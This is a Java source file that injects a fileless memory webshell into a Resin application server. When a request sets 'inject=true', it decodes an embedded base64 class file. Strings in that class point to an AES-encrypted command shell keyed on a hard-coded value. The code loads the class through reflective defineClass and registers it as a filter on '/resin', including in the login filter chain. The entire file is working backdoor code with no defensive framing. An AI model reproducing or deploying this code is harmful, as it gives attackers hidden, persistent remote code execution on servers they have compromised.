package com.sorry.bug.resin;

import com.caucho.server.dispatch.FilterConfigImpl;
import com.caucho.server.dispatch.FilterMapper;
import com.caucho.server.dispatch.FilterMapping;
import com.caucho.server.webapp.WebApp;
import sun.misc.BASE64Decoder;

import javax.servlet.*;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.ArrayList;

/**
 * created by 0x22cb7139 on 2021/6/24
 */
//Resin
public class Resin38Filter implements Filter {


    @Override
    public void init(FilterConfig filterConfig) throws ServletException {
    }

    @Override
    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
        HttpServletRequest req = (HttpServletRequest) servletRequest;
        HttpServletResponse rsp = (HttpServletResponse) servletResponse;
        if(req.getParameter("inject").equals("true")){
            try{
                String filter64="yv66vgAAADQA7AoALwBxCQByAHMIAHQKAHUAdgcAdwcAeAgAeQgAegsABgB7CwAFAHwIAH0KACMAfggAfwsABQCACACBCwCCAIMIAIQKAIUAhgcAhwoAIwCICgATAIkKAIUAigcAiwoAFwBxCACMCwCNAI4IAI8IAJALAAUAkQcAkgoAHgBxCgCTAJQKAB4AlQoAhQCWBwCXCgAjAJgKAC8AmQoAKgCaCACbCgCcAJ0IAJ4HAJ8HAFEJAKAAoQoAKgCiCgCjAKQHAKUKAKAApgoAowCnCgAqAKgKAC8AfgcAqQoANACqCwCrAKwHAK0HAK4BAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAHExjb20vc29ycnkvYnVnL0N1c3RvbUZpbHRlcjsBAARpbml0AQAfKExqYXZheC9zZXJ2bGV0L0ZpbHRlckNvbmZpZzspVgEADGZpbHRlckNvbmZpZwEAHExqYXZheC9zZXJ2bGV0L0ZpbHRlckNvbmZpZzsBAApFeGNlcHRpb25zBwCvAQAIZG9GaWx0ZXIBAFsoTGphdmF4L3NlcnZsZXQvU2VydmxldFJlcXVlc3Q7TGphdmF4L3NlcnZsZXQvU2VydmxldFJlc3BvbnNlO0xqYXZheC9zZXJ2bGV0L0ZpbHRlckNoYWluOylWAQABawEAEkxqYXZhL2xhbmcvU3RyaW5nOwEAAWMBABVMamF2YXgvY3J5cHRvL0NpcGhlcjsBAAtwYWdlQ29udGV4dAEAD0xqYXZhL3V0aWwvTWFwOwEAAmJmAQAYTGphdmEvaW8vQnVmZmVyZWRSZWFkZXI7AQAOZXZpbENsYXNzQnl0ZXMBAAJbQgEAAnNiAQALY2xhc3Nsb2FkZXIBABdMamF2YS9sYW5nL0NsYXNzTG9hZGVyOwEAC2RlZmluZWNsYXNzAQAaTGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZDsBAAVjbGF6egEAEUxqYXZhL2xhbmcvQ2xhc3M7AQABYQEAEkxqYXZhL2xhbmcvT2JqZWN0OwEAAWUBABVMamF2YS9sYW5nL0V4Y2VwdGlvbjsBAA5zZXJ2bGV0UmVxdWVzdAEAHkxqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0OwEAD3NlcnZsZXRSZXNwb25zZQEAH0xqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXNwb25zZTsBAAtmaWx0ZXJDaGFpbgEAG0xqYXZheC9zZXJ2bGV0L0ZpbHRlckNoYWluOwEAA3JlcQEAJ0xqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0OwEAA3JzcAEAKExqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXNwb25zZTsBABZMb2NhbFZhcmlhYmxlVHlwZVRhYmxlAQA1TGphdmEvdXRpbC9NYXA8TGphdmEvbGFuZy9TdHJpbmc7TGphdmEvbGFuZy9PYmplY3Q7PjsBAA1TdGFja01hcFRhYmxlBwB3BwB4BwCpBwCwAQAHZGVzdHJveQEAClNvdXJjZUZpbGUBABFDdXN0b21GaWx0ZXIuamF2YQwAOQA6BwCxDACyALMBABVGaWx0ZXLliJ3lp4vljJbliJvlu7oHALQMALUAtgEAJWphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3QBACZqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXNwb25zZQEABmluamVjdAEACG1lbXNoZWxsDAC3ALgMALkAugEABFBPU1QMALsAvAEAEGU0NWUzMjlmZWI1ZDkyNWIMAL0AvgEAAXUHAL8MAMAAwQEAA0FFUwcAwgwAwwDEAQAfamF2YXgvY3J5cHRvL3NwZWMvU2VjcmV0S2V5U3BlYwwAxQDGDAA5AMcMAEAAyAEAEWphdmEvdXRpbC9IYXNoTWFwAQAHc2Vzc2lvbgcAyQwAygDLAQAHcmVxdWVzdAEACHJlc3BvbnNlDADMAM0BABZzdW4vbWlzYy9CQVNFNjREZWNvZGVyBwDODADPALoMANAA0QwA0gDTAQAQamF2YS9sYW5nL1N0cmluZwwAOQDUDADVANYMANcA2AEAFWphdmEubGFuZy5DbGFzc0xvYWRlcgcA2QwA2gDbAQALZGVmaW5lQ2xhc3MBAA9qYXZhL2xhbmcvQ2xhc3MHANwMAN0AWAwA3gDfBwDgDADhAOIBABBqYXZhL2xhbmcvT2JqZWN0DADjAOQMAOUA5gwA5wDoAQATamF2YS9sYW5nL0V4Y2VwdGlvbgwA6QA6BwDqDABGAOsBABpjb20vc29ycnkvYnVnL0N1c3RvbUZpbHRlcgEAFGphdmF4L3NlcnZsZXQvRmlsdGVyAQAeamF2YXgvc2VydmxldC9TZXJ2bGV0RXhjZXB0aW9uAQATamF2YS9pby9JT0V4Y2VwdGlvbgEAEGphdmEvbGFuZy9TeXN0ZW0BAANvdXQBABVMamF2YS9pby9QcmludFN0cmVhbTsBABNqYXZhL2lvL1ByaW50U3RyZWFtAQAHcHJpbnRsbgEAFShMamF2YS9sYW5nL1N0cmluZzspVgEACXNldEhlYWRlcgEAJyhMamF2YS9sYW5nL1N0cmluZztMamF2YS9sYW5nL1N0cmluZzspVgEACWdldE1ldGhvZAEAFCgpTGphdmEvbGFuZy9TdHJpbmc7AQAGZXF1YWxzAQAVKExqYXZhL2xhbmcvT2JqZWN0OylaAQAKZ2V0U2Vzc2lvbgEAIigpTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2Vzc2lvbjsBAB5qYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlc3Npb24BAAxzZXRBdHRyaWJ1dGUBACcoTGphdmEvbGFuZy9TdHJpbmc7TGphdmEvbGFuZy9PYmplY3Q7KVYBABNqYXZheC9jcnlwdG8vQ2lwaGVyAQALZ2V0SW5zdGFuY2UBACkoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZheC9jcnlwdG8vQ2lwaGVyOwEACGdldEJ5dGVzAQAEKClbQgEAFyhbQkxqYXZhL2xhbmcvU3RyaW5nOylWAQAXKElMamF2YS9zZWN1cml0eS9LZXk7KVYBAA1qYXZhL3V0aWwvTWFwAQADcHV0AQA4KExqYXZhL2xhbmcvT2JqZWN0O0xqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsBAAlnZXRSZWFkZXIBABooKUxqYXZhL2lvL0J1ZmZlcmVkUmVhZGVyOwEAFmphdmEvaW8vQnVmZmVyZWRSZWFkZXIBAAhyZWFkTGluZQEADGRlY29kZUJ1ZmZlcgEAFihMamF2YS9sYW5nL1N0cmluZzspW0IBAAdkb0ZpbmFsAQAGKFtCKVtCAQAFKFtCKVYBAAhnZXRDbGFzcwEAEygpTGphdmEvbGFuZy9DbGFzczsBAA5nZXRDbGFzc0xvYWRlcgEAGSgpTGphdmEvbGFuZy9DbGFzc0xvYWRlcjsBABVqYXZhL2xhbmcvQ2xhc3NMb2FkZXIBAAlsb2FkQ2xhc3MBACUoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvQ2xhc3M7AQARamF2YS9sYW5nL0ludGVnZXIBAARUWVBFAQARZ2V0RGVjbGFyZWRNZXRob2QBAEAoTGphdmEvbGFuZy9TdHJpbmc7W0xqYXZhL2xhbmcvQ2xhc3M7KUxqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2Q7AQAYamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kAQANc2V0QWNjZXNzaWJsZQEABChaKVYBAAd2YWx1ZU9mAQAWKEkpTGphdmEvbGFuZy9JbnRlZ2VyOwEABmludm9rZQEAOShMamF2YS9sYW5nL09iamVjdDtbTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwEAC25ld0luc3RhbmNlAQAUKClMamF2YS9sYW5nL09iamVjdDsBAA9wcmludFN0YWNrVHJhY2UBABlqYXZheC9zZXJ2bGV0L0ZpbHRlckNoYWluAQBAKExqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0O0xqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXNwb25zZTspVgAhADcALwABADgAAAAEAAEAOQA6AAEAOwAAAC8AAQABAAAABSq3AAGxAAAAAgA8AAAABgABAAAADAA9AAAADAABAAAABQA+AD8AAAABAEAAQQACADsAAABBAAIAAgAAAAmyAAISA7YABLEAAAACADwAAAAKAAIAAAAPAAgAEAA9AAAAFgACAAAACQA+AD8AAAAAAAkAQgBDAAEARAAAAAQAAQBFAAEARgBHAAIAOwAAApIABgAQAAABMCvAAAU6BCzAAAY6BRkFEgcSCLkACQMAGQS5AAoBABILtgAMmQD6Eg06BhkEuQAOAQASDxkGuQAQAwASEbgAEjoHGQcFuwATWRkGtgAUEhG3ABW2ABa7ABdZtwAYOggZCBIZGQS5AA4BALkAGgMAVxkIEhsZBLkAGgMAVxkIEhwZBbkAGgMAVxkEuQAdAQA6CRkHuwAeWbcAHxkJtgAgtgAhtgAiOgq7ACNZGQq3ACQ6Cyq2ACW2ACY6DCq2ACW2ACYSJ7YAKBIpBr0AKlkDEitTWQSyACxTWQWyACxTtgAtOg0ZDQS2AC4ZDRkMBr0AL1kDGQpTWQQDuAAwU1kFGQq+uAAwU7YAMcAAKjoOGQ62ADI6DxkPGQi2ADNXsacACjoGGQa2ADUtKyy5ADYDALEAAQAXARwBIAA0AAQAPAAAAG4AGwAAABQABgAVAAwAFgAXABgAJgAZACoAGgA6ABsAQQAcAFUAHQBeAB4AbwAfAHsAIACHACEAkAAiAKYAIwCxACQAugAlAOIAJgDoACcBDQAoARQAKQEcACoBHQAuASAALAEiAC0BJwAvAS8AMAA9AAAArAARACoA8wBIAEkABgBBANwASgBLAAcAXgC/AEwATQAIAJAAjQBOAE8ACQCmAHcAUABRAAoAsQBsAFIASQALALoAYwBTAFQADADiADsAVQBWAA0BDQAQAFcAWAAOARQACQBZAFoADwEiAAUAWwBcAAYAAAEwAD4APwAAAAABMABdAF4AAQAAATAAXwBgAAIAAAEwAGEAYgADAAYBKgBjAGQABAAMASQAZQBmAAUAZwAAAAwAAQBeAL8ATABoAAgAaQAAABAAA/0BHQcAagcAa0IHAGwGAEQAAAAGAAIAbQBFAAEAbgA6AAEAOwAAACsAAAABAAAAAbEAAAACADwAAAAGAAEAAAA1AD0AAAAMAAEAAAABAD4APwAAAAEAbwAAAAIAcA==";
                byte[] evil = new BASE64Decoder().decodeBuffer(filter64);
                ClassLoader classloader = Thread.currentThread().getContextClassLoader();
                Class servletInvocationcls = classloader.loadClass("com.caucho.server.dispatch.ServletInvocation");
                Class filterConfigimplcls = classloader.loadClass("com.caucho.server.dispatch.FilterConfigImpl");
                Class filterMappingcls = classloader.loadClass("com.caucho.server.dispatch.FilterMapping");
                Class filterMappercls = classloader.loadClass("com.caucho.server.dispatch.FilterMapper");

                Object contextRequest = servletInvocationcls.getMethod("getContextRequest").invoke(null);
                WebApp webapp = (WebApp)contextRequest.getClass().getMethod("getWebApp").invoke(contextRequest);
                Method defineclass= classloader.loadClass("java.lang.ClassLoader").getDeclaredMethod("defineClass",byte[].class,Integer.TYPE,Integer.TYPE);
                defineclass.setAccessible(true);
                Class clazz = (Class) defineclass.invoke(classloader,evil,0,evil.length);
                Filter newFilter = (Filter) clazz.newInstance();
                String newFilterStr = "newfilter";
                //Filter newFilter = new CustomFilter();
                FilterConfigImpl filterConfigimpl = (FilterConfigImpl)filterConfigimplcls.newInstance();
                filterConfigimpl.setFilterName(newFilterStr);
                filterConfigimpl.setFilterClass(newFilter.getClass().getName());

                webapp.addFilter(filterConfigimpl);
                FilterMapping filterMapping = (FilterMapping)filterMappingcls.newInstance();
                FilterMapping.URLPattern filterMappingUrlpattern = filterMapping.createUrlPattern();
                filterMappingUrlpattern.addText("/resin");
                filterMappingUrlpattern.init();
                filterMapping.setFilterName(newFilterStr);
                filterMapping.setServletContext(webapp);


//set filtterMapper
                Field fieldWebappFilterMapper = null;
                try {
                    fieldWebappFilterMapper = webapp.getClass().getDeclaredField("_filterMapper");
                }catch (NoSuchFieldException Exception){
                    fieldWebappFilterMapper = webapp.getClass().getSuperclass().getDeclaredField("_filterMapper");
                }

                fieldWebappFilterMapper.setAccessible(true);
                FilterMapper filtermapper = (FilterMapper) fieldWebappFilterMapper.get(webapp);

                Field fieldFilterMapperFilterMap = filterMappercls.getDeclaredField("_filterMap");
                fieldFilterMapperFilterMap.setAccessible(true);

                ArrayList<FilterMapping> orginalfilterMappings = (ArrayList) fieldFilterMapperFilterMap.get(filtermapper);
                ArrayList<FilterMapping> newFilterMappings = new ArrayList(orginalfilterMappings.size() + 1);
                newFilterMappings.add(filterMapping);

                int count = 0;
                while(count < orginalfilterMappings.size()){
                    newFilterMappings.add(orginalfilterMappings.get(count));
                    ++ count;
                }

                fieldFilterMapperFilterMap.set(filtermapper, newFilterMappings);
                fieldWebappFilterMapper.set(webapp, filtermapper);

//set loginFilterMapper
                Field fieldWebappLoginFilterMapper = null;
                try{
                    fieldWebappLoginFilterMapper = webapp.getClass().getDeclaredField("_loginFilterMapper");
                }catch (NoSuchFieldException Exception){
                    fieldWebappLoginFilterMapper = webapp.getClass().getSuperclass().getDeclaredField("_loginFilterMapper");
                }

                fieldWebappLoginFilterMapper.setAccessible(true);
                FilterMapper loginFilterMapper = (FilterMapper)fieldWebappLoginFilterMapper.get(webapp);

                ArrayList<FilterMapping>  orginLoginFilterMappings = (ArrayList) fieldFilterMapperFilterMap.get(loginFilterMapper);
                ArrayList<FilterMapping> newLoginFilterMappings = new ArrayList(orginLoginFilterMappings.size() + 1);
                newLoginFilterMappings.add(filterMapping);

                count = 0;
                while( count < orginLoginFilterMappings.size()){
                    newLoginFilterMappings.add(orginLoginFilterMappings.get(count));
                    ++ count;
                }

                fieldFilterMapperFilterMap.set(loginFilterMapper, newLoginFilterMappings);
                fieldWebappLoginFilterMapper.set(webapp, loginFilterMapper);

                webapp.getClass().getMethod("clearCache").invoke(webapp);
            }catch (Exception e){
                e.printStackTrace();
            }
        }
    }


    @Override
    public void destroy() {
        //
    }
}
